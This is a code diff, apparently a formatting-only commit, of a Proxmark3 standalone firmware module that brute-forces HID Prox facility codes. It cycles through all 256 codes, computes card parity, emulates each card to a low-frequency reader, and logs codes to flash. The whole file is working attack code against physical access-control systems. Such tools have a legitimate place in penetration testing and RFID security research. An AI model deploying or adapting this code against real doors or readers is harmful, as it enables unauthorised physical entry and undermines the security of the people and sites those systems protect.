@@ -6,7 +6,7 @@
  *
  * Author: proxmark@ss23.geek.nz - ss23
  * Based on lf_hidbrute
- * 
+ *
  * To retrieve log file from flash:
  *
  * 1. mem spiffs dump -s lf_hid_fcbrute.log -d lf_hid_fcbrute.log
@@ -44,125 +44,125 @@
 #define LF_HIDCOLLECT_LOGFILE "lf_hid_fcbrute.log"
 
 static void append(uint8_t *entry, size_t entry_len) {
-	LED_B_ON();
-	DbpString("Writing... ");
-	DbpString((char *)entry);
-	rdv40_spiffs_append(LF_HIDCOLLECT_LOGFILE, entry, entry_len, RDV40_SPIFFS_SAFETY_SAFE);
-	LED_B_OFF();
+    LED_B_ON();
+    DbpString("Writing... ");
+    DbpString((char *)entry);
+    rdv40_spiffs_append(LF_HIDCOLLECT_LOGFILE, entry, entry_len, RDV40_SPIFFS_SAFETY_SAFE);
+    LED_B_OFF();
 }
 
 void ModInfo(void) {
-	DbpString(_YELLOW_("  LF - HID facility code bruteforce - (ss23)"));
+    DbpString(_YELLOW_("  LF - HID facility code bruteforce - (ss23)"));
 }
 
 void RunMod(void) {
-	FpgaDownloadAndGo(FPGA_BITSTREAM_LF);
-	LFSetupFPGAForADC(LF_DIVISOR_125, true);
-	BigBuf_Clear();
-	StandAloneMode();
-	WDT_HIT();
+    FpgaDownloadAndGo(FPGA_BITSTREAM_LF);
+    LFSetupFPGAForADC(LF_DIVISOR_125, true);
+    BigBuf_Clear();
+    StandAloneMode();
+    WDT_HIT();
 
-	LEDsoff();
-	LED_A_ON();
-	LED_B_ON();
-	LED_C_ON();
+    LEDsoff();
+    LED_A_ON();
+    LED_B_ON();
+    LED_C_ON();
 
-	rdv40_spiffs_lazy_mount();
-	// Buffer for writing to log
-	uint8_t entry[81];
-	memset(entry, 0, sizeof(entry));
-	sprintf((char *)entry, "%s\n", "HID FC brute start");
+    rdv40_spiffs_lazy_mount();
+    // Buffer for writing to log
+    uint8_t entry[81];
+    memset(entry, 0, sizeof(entry));
+    sprintf((char *)entry, "%s\n", "HID FC brute start");
 
-	// Create the log file
-	if (exists_in_spiffs(LF_HIDCOLLECT_LOGFILE)) {
-		rdv40_spiffs_append(LF_HIDCOLLECT_LOGFILE, entry, strlen((char *)entry), RDV40_SPIFFS_SAFETY_SAFE);
-	} else {
-		rdv40_spiffs_write(LF_HIDCOLLECT_LOGFILE, entry, strlen((char *)entry), RDV40_SPIFFS_SAFETY_SAFE);
-	}
-	LED_B_OFF();
+    // Create the log file
+    if (exists_in_spiffs(LF_HIDCOLLECT_LOGFILE)) {
+        rdv40_spiffs_append(LF_HIDCOLLECT_LOGFILE, entry, strlen((char *)entry), RDV40_SPIFFS_SAFETY_SAFE);
+    } else {
+        rdv40_spiffs_write(LF_HIDCOLLECT_LOGFILE, entry, strlen((char *)entry), RDV40_SPIFFS_SAFETY_SAFE);
+    }
+    LED_B_OFF();
 
-	Dbprintf("Waiting to begin bruteforce");
+    Dbprintf("Waiting to begin bruteforce");
 
-	// Wait until the user presses the button to begin the bruteforce
-	for (;;) {
-		// Hit the watchdog timer regularly
-		WDT_HIT();
-		int button_pressed = BUTTON_HELD(10);
-		if ((button_pressed == BUTTON_HOLD) || (button_pressed == BUTTON_SINGLE_CLICK)) {
-			break;
-		}
-	}
+    // Wait until the user presses the button to begin the bruteforce
+    for (;;) {
+        // Hit the watchdog timer regularly
+        WDT_HIT();
+        int button_pressed = BUTTON_HELD(10);
+        if ((button_pressed == BUTTON_HOLD) || (button_pressed == BUTTON_SINGLE_CLICK)) {
+            break;
+        }
+    }
 
-	Dbprintf("Running Bruteforce");
+    Dbprintf("Running Bruteforce");
 
-	LEDsoff();
-	LED_A_ON();
+    LEDsoff();
+    LED_A_ON();
 
-	// Buffer for HID data
-	uint32_t high, low;
+    // Buffer for HID data
+    uint32_t high, low;
 
-	for (uint32_t fc = 0; fc < 256; fc++) {
-		// Hit the watchdog timer regularly
-		WDT_HIT();
+    for (uint32_t fc = 0; fc < 256; fc++) {
+        // Hit the watchdog timer regularly
+        WDT_HIT();
 
-		LEDsoff();
+        LEDsoff();
 
-		// Toggle LED_C
-		if ((fc % 2) == 1) {
-			LED_C_ON();
-		}
+        // Toggle LED_C
+        if ((fc % 2) == 1) {
+            LED_C_ON();
+        }
 
-		// If we get USB data, break out
-		if (data_available()) break;
+        // If we get USB data, break out
+        if (data_available()) break;
 
-		// If a user attempts to hold button, abort the run
-		/*
-		int button_pressed = BUTTON_HELD(1000); // 1 second
-		if (button_pressed == BUTTON_HOLD) {
-			break;
-		}
-		*/
-		// If a user pressed the button once, briefly, output the current FC to the log file
-		if (BUTTON_PRESS()) {
-			memset(entry, 0, sizeof(entry));
+        // If a user attempts to hold button, abort the run
+        /*
+        int button_pressed = BUTTON_HELD(1000); // 1 second
+        if (button_pressed == BUTTON_HOLD) {
+        	break;
+        }
+        */
+        // If a user pressed the button once, briefly, output the current FC to the log file
+        if (BUTTON_PRESS()) {
+            memset(entry, 0, sizeof(entry));
 
-			sprintf((char *)entry, "FC: %li\n", fc);
-			append(entry, strlen((char *)entry));
-		}
+            sprintf((char *)entry, "FC: %li\n", fc);
+            append(entry, strlen((char *)entry));
+        }
 
-		// Calculate data required for a HID card
-		hid_calculate_checksum_and_set(&high, &low, 1, fc);
+        // Calculate data required for a HID card
+        hid_calculate_checksum_and_set(&high, &low, 1, fc);
 
-		// Print actual code to brute
-		Dbprintf("[=] TAG ID: %x%08x (%d) - FC: %u - Card: %u", high, low, (low >> 1) & 0xFFFF, fc, 1);
+        // Print actual code to brute
+        Dbprintf("[=] TAG ID: %x%08x (%d) - FC: %u - Card: %u", high, low, (low >> 1) & 0xFFFF, fc, 1);
 
-		LED_A_ON();
-		LED_D_ON();
-		StartTicks();
-		CmdHIDsimTAGEx(0, high, low, 0, 1, 40000);
-		LED_D_OFF();
-		StartTicks();
-		WaitMS(50);
-		StopTicks();
-		LED_A_OFF();
-	}
+        LED_A_ON();
+        LED_D_ON();
+        StartTicks();
+        CmdHIDsimTAGEx(0, high, low, 0, 1, 40000);
+        LED_D_OFF();
+        StartTicks();
+        WaitMS(50);
+        StopTicks();
+        LED_A_OFF();
+    }
 
-	LEDsoff();
+    LEDsoff();
 }
 
 void hid_calculate_checksum_and_set(uint32_t *high, uint32_t *low, uint32_t cardnum, uint32_t fc) {
-	uint32_t newhigh = 0;
-	uint32_t newlow = 0;
+    uint32_t newhigh = 0;
+    uint32_t newlow = 0;
 
-	newlow = 0;
-	newlow |= (cardnum & 0xFFFF) << 1;
-	newlow |= (fc & 0xFF) << 17;
-	newlow |= oddparity32((newlow >> 1) & 0xFFF);
-	newlow |= (evenparity32((newlow >> 13) & 0xFFF)) << 25;
+    newlow = 0;
+    newlow |= (cardnum & 0xFFFF) << 1;
+    newlow |= (fc & 0xFF) << 17;
+    newlow |= oddparity32((newlow >> 1) & 0xFFF);
+    newlow |= (evenparity32((newlow >> 13) & 0xFFF)) << 25;
 
-        newhigh |= 0x20; // Bit 37; standard header
-        newlow |= 1U << 26; // leading 1: start bit
+    newhigh |= 0x20; // Bit 37; standard header
+    newlow |= 1U << 26; // leading 1: start bit
 
-	*low = newlow;
-	*high = newhigh;
+    *low = newlow;
+    *high = newhigh;
 }
